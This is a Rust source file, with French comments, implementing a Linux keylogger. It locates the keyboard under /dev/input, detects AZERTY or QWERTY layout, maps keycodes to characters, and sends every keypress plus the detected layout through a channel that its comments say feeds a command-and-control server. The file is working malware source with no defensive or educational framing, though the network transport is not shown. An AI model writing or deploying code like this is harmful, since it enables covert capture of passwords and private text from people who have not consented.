use evdev::{Device, EventType, Key};
use std::sync::mpsc::Sender;
use std::process::Command;

/// ✅ Détection automatique clavier
pub fn detect_keyboard_device() -> Option<String> {
    for entry in std::fs::read_dir("/dev/input").unwrap() {
        let path = entry.unwrap().path();
        if path.to_str().unwrap().contains("event") {
            if let Ok(dev) = evdev::Device::open(&path) {
                if let Some(name) = dev.name() {
                    if name.to_lowercase().contains("keyboard") || name.to_lowercase().contains("kbd") {
                        return Some(path.to_str().unwrap().to_string());
                    }
                }
            }
        }
    }
    None
}

/// ✅ Détecter le layout pour savoir si AZERTY
pub fn detect_keyboard_layout() -> bool {
    let output = Command::new("setxkbmap").arg("-print").output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    stdout.contains("fr")
}

/// ✅ Mapper le Key en caractère en fonction du layout
fn map_key(key: Key, is_azerty: bool) -> String {
    match key {
        Key::KEY_A => if is_azerty { "q" } else { "a" }.into(),
        Key::KEY_Q => if is_azerty { "a" } else { "q" }.into(),
        Key::KEY_W => if is_azerty { "z" } else { "w" }.into(),
        Key::KEY_Z => if is_azerty { "w" } else { "z" }.into(),
        Key::KEY_M => if is_azerty { ";" } else { "m" }.into(),

        Key::KEY_B => "b".into(),
        Key::KEY_C => "c".into(),
        Key::KEY_D => "d".into(),
        Key::KEY_E => "e".into(),
        Key::KEY_F => "f".into(),
        Key::KEY_G => "g".into(),
        Key::KEY_H => "h".into(),
        Key::KEY_I => "i".into(),
        Key::KEY_J => "j".into(),
        Key::KEY_K => "k".into(),
        Key::KEY_L => "l".into(),
        Key::KEY_N => "n".into(),
        Key::KEY_O => "o".into(),
        Key::KEY_P => "p".into(),
        Key::KEY_R => "r".into(),
        Key::KEY_S => "s".into(),
        Key::KEY_T => "t".into(),
        Key::KEY_U => "u".into(),
        Key::KEY_V => "v".into(),
        Key::KEY_X => "x".into(),
        Key::KEY_Y => "y".into(),

        Key::KEY_1 => if is_azerty { "&" } else { "1" }.into(),
        Key::KEY_2 => if is_azerty { "é" } else { "2" }.into(),
        Key::KEY_3 => if is_azerty { "\"" } else { "3" }.into(),
        Key::KEY_4 => if is_azerty { "'" } else { "4" }.into(),
        Key::KEY_5 => if is_azerty { "(" } else { "5" }.into(),
        Key::KEY_6 => if is_azerty { "-" } else { "6" }.into(),
        Key::KEY_7 => if is_azerty { "è" } else { "7" }.into(),
        Key::KEY_8 => if is_azerty { "_" } else { "8" }.into(),
        Key::KEY_9 => if is_azerty { "ç" } else { "9" }.into(),
        Key::KEY_0 => if is_azerty { "à" } else { "0" }.into(),

        Key::KEY_SPACE => " ".into(),
        Key::KEY_ENTER => "\n".into(),
        Key::KEY_BACKSPACE => "[BACKSPACE]".into(),
        Key::KEY_TAB => "\t".into(),
        Key::KEY_ESC => "[ESC]".into(),
        Key::KEY_SEMICOLON => ";".into(),
        Key::KEY_COMMA => ",".into(),
        Key::KEY_DOT => ".".into(),
        Key::KEY_MINUS => "-".into(),
        Key::KEY_EQUAL => "=".into(),
        Key::KEY_APOSTROPHE => "'".into(),
        Key::KEY_SLASH => "/".into(),
        Key::KEY_BACKSLASH => "\\".into(),
        Key::KEY_GRAVE => "`".into(),
        Key::KEY_LEFTBRACE => "[".into(),
        Key::KEY_RIGHTBRACE => "]".into(),
        
        // Pavé numérique explicite
	Key::KEY_KP0 => "0".into(),
	Key::KEY_KP1 => "1".into(),
	Key::KEY_KP2 => "2".into(),
	Key::KEY_KP3 => "3".into(),
	Key::KEY_KP4 => "4".into(),
	Key::KEY_KP5 => "5".into(),
	Key::KEY_KP6 => "6".into(),
	Key::KEY_KP7 => "7".into(),
	Key::KEY_KP8 => "8".into(),
	Key::KEY_KP9 => "9".into(),
	Key::KEY_KPDOT => ".".into(),
	Key::KEY_KPMINUS => "-".into(),
	Key::KEY_KPPLUS => "+".into(),
	Key::KEY_KPASTERISK => "*".into(),
	Key::KEY_KPSLASH => "/".into(),
	Key::KEY_KPENTER => "\n".into(),

        
        _ => format!("[{:?}]", key),
    }
}

/// ✅ Keylogger : lit les frappes, mappe et envoie au C2 proprement
pub fn start_keylogger(device: &str, tx: Sender<String>) {
    let mut dev = Device::open(device).unwrap();

    // ✅ Détecter layout & définir le string explicite
    let azerty = detect_keyboard_layout();
    let layout_str = if azerty { "AZERTY" } else { "QWERTY" };

    // ✅ Affiche localement
    println!("Layout détecté : {}", layout_str);

    // ✅ Envoie au C2 une seule fois au début
    let _ = tx.send(format!("[LAYOUT] {}\n", layout_str));

    // ✅ Boucle keylogger normale
    loop {
        for ev in dev.fetch_events().unwrap() {
            if ev.event_type() == EventType::KEY {
                let key = Key::new(ev.code());
                let value = ev.value();

                if value == 1 {
                    let mapped = map_key(key, azerty);
                    println!("Touche mappée : {}", mapped);
                    let _ = tx.send(mapped);
                }
            }
        }
    }
}
